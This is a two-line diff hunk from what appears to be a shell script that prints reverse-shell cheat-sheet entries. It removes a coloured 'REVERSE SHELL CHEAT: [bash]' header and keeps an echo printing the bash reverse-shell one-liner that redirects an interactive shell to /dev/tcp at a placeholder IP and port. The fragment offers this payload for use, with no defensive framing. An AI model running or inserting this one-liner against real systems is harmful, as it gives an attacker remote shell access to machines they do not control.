@@ -1,2 +1,1 @@
-echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [bash]\033[m"
 echo -e "\t\033[1mbash -i >& /dev/tcp/$IP/$PORT 0<&1"
